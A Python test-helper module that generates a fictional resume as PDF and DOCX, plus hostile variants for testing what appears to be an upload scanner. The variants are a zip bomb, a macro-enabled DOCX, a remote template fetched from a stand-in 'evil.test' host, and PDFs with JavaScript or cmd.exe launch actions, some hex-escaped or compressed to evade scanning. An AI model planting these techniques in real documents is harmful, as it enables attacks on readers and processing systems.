"""Generate resume documents for tests (no binary fixtures in the repo).

`SAMPLE_RESUME` is a fictional person. `make_pdf` / `make_docx` render any
list of (kind, text) blocks; hostile variants live at the bottom.
"""

import io
import zipfile
import zlib

from docx import Document
from docx.shared import Pt
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# (kind, text): kind is "name", "heading", "text" or "bullet"
Block = tuple[str, str]

SAMPLE_RESUME: list[Block] = [
    ("name", "Jordan Rivera"),
    ("text", "San Francisco, CA | jordan.rivera@example.com | (415) 555-0142"),
    ("text", "linkedin.com/in/jordan-rivera | github.com/jrivera | https://jordanrivera.dev"),
    ("heading", "SUMMARY"),
    ("text", "Backend engineer with 7+ years building data platforms and APIs."),
    ("heading", "EXPERIENCE"),
    ("text", "Senior Software Engineer | Acme Corp | San Francisco, CA"),
    ("text", "Jan 2021 - Present"),
    ("bullet", "Led migration of billing services to Kubernetes, cutting costs 30%"),
    ("bullet", "Built event pipelines in Python and Kafka processing 2B events/day"),
    ("text", "Software Engineer, Globex Inc - Remote"),
    ("text", "June 2017 - December 2020"),
    ("bullet", "Designed REST APIs in Go and PostgreSQL serving 50k requests/second"),
    ("bullet", "Mentored 4 junior engineers"),
    ("heading", "EDUCATION"),
    ("text", "University of California, Berkeley"),
    ("text", "B.S. in Computer Science, 2013 - 2017, GPA: 3.8"),
    ("heading", "SKILLS"),
    ("text", "Languages: Python, Go, TypeScript, SQL"),
    ("text", "Tools: Docker, Kubernetes, AWS, Terraform, PostgreSQL, Redis, Kafka"),
    ("heading", "CERTIFICATIONS"),
    ("text", "AWS Certified Solutions Architect - Associate, Amazon Web Services, 2022"),
    ("heading", "PROJECTS"),
    ("text", "OpenTrace - Distributed tracing toolkit written in Go"),
    ("bullet", "500+ GitHub stars; used in production by 3 companies"),
    ("heading", "PUBLICATIONS"),
    ("text", '"Scaling Event Pipelines", Data Engineering Journal, 2020'),
    ("heading", "AWARDS"),
    ("text", "Hackathon Winner, Acme Global Hackathon, 2022"),
]


def make_pdf(blocks: list[Block] = SAMPLE_RESUME, *, encrypt_password: str | None = None) -> bytes:
    buf = io.BytesIO()
    kwargs = {}
    if encrypt_password:
        from reportlab.lib.pdfencrypt import StandardEncryption

        kwargs["encrypt"] = StandardEncryption(encrypt_password, canPrint=1)
    c = canvas.Canvas(buf, pagesize=letter, **kwargs)
    c.setTitle("Resume")
    width, height = letter
    y = height - 60
    for kind, text in blocks:
        if y < 60:
            c.showPage()
            y = height - 60
        if kind == "name":
            c.setFont("Helvetica-Bold", 18)
        elif kind == "heading":
            y -= 6
            c.setFont("Helvetica-Bold", 12)
        else:
            c.setFont("Helvetica", 10)
        prefix = "• " if kind == "bullet" else ""
        c.drawString(72 if kind != "bullet" else 84, y, prefix + text)
        if kind == "text" and "linkedin.com" in text:
            c.linkURL("https://www.linkedin.com/in/jordan-rivera", (72, y - 2, 400, y + 10))
        y -= 22 if kind == "name" else 15
    c.save()
    return buf.getvalue()


def make_docx(blocks: list[Block] = SAMPLE_RESUME, *, contact_in_header: bool = False) -> bytes:
    doc = Document()
    for kind, text in blocks:
        if kind == "name":
            doc.add_heading(text, level=0)
        elif kind == "heading":
            doc.add_heading(text.title(), level=1)
        elif kind == "bullet":
            doc.add_paragraph(text, style="List Bullet")
        elif contact_in_header and ("@" in text or "linkedin" in text):
            doc.sections[0].header.add_paragraph(text)
        else:
            p = doc.add_paragraph()
            run = p.add_run(text)
            run.font.size = Pt(10)
    buf = io.BytesIO()
    doc.save(buf)
    return buf.getvalue()


def docx_with_parts(extra: dict[str, bytes], *, content_types_extra: bytes = b"") -> bytes:
    """A valid DOCX with extra zip entries (macros, ActiveX, embeddings, ...)."""
    src = zipfile.ZipFile(io.BytesIO(make_docx()))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            data = src.read(info.filename)
            if info.filename == "[Content_Types].xml" and content_types_extra:
                data = data.replace(b"</Types>", content_types_extra + b"</Types>")
            dst.writestr(info, data)
        for name, data in extra.items():
            dst.writestr(name, data)
    return out.getvalue()


def zip_bomb_docx() -> bytes:
    return docx_with_parts({"word/media/bomb.bin": b"\0" * (20 * 1024 * 1024)})


def macro_docx() -> bytes:
    ct = b'<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
    return docx_with_parts({"word/vbaProject.bin": b"VBA"}, content_types_extra=ct)


def remote_template_docx() -> bytes:
    rels = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        b'relationships/attachedTemplate" Target="http://evil.test/t.dotm" TargetMode="External"/>'
        b"</Relationships>"
    )
    return docx_with_parts({"word/_rels/settings.xml.rels": rels})


def _raw_pdf(catalog_extra: str, extra_objects: str = "", body_text: str = "Hello") -> bytes:
    stream = f"BT /F1 12 Tf 72 720 Td ({body_text}) Tj ET".encode()
    objs = [
        f"<< /Type /Catalog /Pages 2 0 R {catalog_extra} >>",
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        "/Resources << /Font << /F1 5 0 R >> >> >>",
        None,  # content stream
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n")
    offsets = []
    for i, obj in enumerate(objs, start=1):
        offsets.append(out.tell())
        if obj is None:
            out.write(f"{i} 0 obj\n<< /Length {len(stream)} >>\nstream\n".encode())
            out.write(stream + b"\nendstream\nendobj\n")
        else:
            out.write(f"{i} 0 obj\n{obj}\nendobj\n".encode())
    out.write(extra_objects.encode())
    xref = out.tell()
    out.write(f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode())
    for off in offsets:
        out.write(f"{off:010d} 00000 n \n".encode())
    out.write(
        f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    )
    return out.getvalue()


def javascript_pdf() -> bytes:
    return _raw_pdf("/OpenAction << /S /JavaScript /JS (app.alert(1)) >>")


def hex_escaped_javascript_pdf() -> bytes:
    # "/J#61vaScript" is "/JavaScript" with one character hex-escaped.
    return _raw_pdf("/OpenAction << /S /J#61vaScript /J#53 (app.alert(1)) >>")


def launch_action_pdf() -> bytes:
    return _raw_pdf("/OpenAction << /S /Launch /F (cmd.exe) >>")


def compressed_javascript_pdf() -> bytes:
    """JavaScript name hidden inside a compressed object stream (raw scan can't see it)."""
    inner = b"<< /S /JavaScript /JS (app.alert(1)) >>"
    objstm_body = b"6 0 " + inner
    compressed = zlib.compress(objstm_body)
    extra = (
        f"7 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length {len(compressed)} >>\n"
        "stream\n"
    )
    # Write bytes manually: the stream body is binary.
    base = _raw_pdf("/OpenAction 6 0 R")
    head, _, _ = base.partition(b"xref\n")
    body = head + extra.encode() + compressed + b"\nendstream\nendobj\n"
    # Rebuild a minimal xref-less trailer: pdfminer falls back to scanning objects.
    return body + b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"


def plain_raw_pdf(text: str = "Hello") -> bytes:
    return _raw_pdf("", body_text=text)
